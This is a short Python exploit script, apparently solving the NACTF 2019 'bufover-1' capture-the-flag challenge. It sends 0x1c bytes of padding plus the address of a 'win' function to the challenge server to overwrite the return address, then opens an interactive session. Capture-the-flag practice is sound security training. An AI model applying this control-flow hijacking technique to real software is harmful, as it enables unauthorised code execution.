from ptrlib import *

elf = ELF("./bufover-1")
#sock = Process("./bufover-1")
sock = Socket("shell.2019.nactf.com", 31462)
payload = b'A' * 0x1c
payload += p32(elf.symbol("win"))
sock.sendlineafter(">", payload)

sock.interactive()
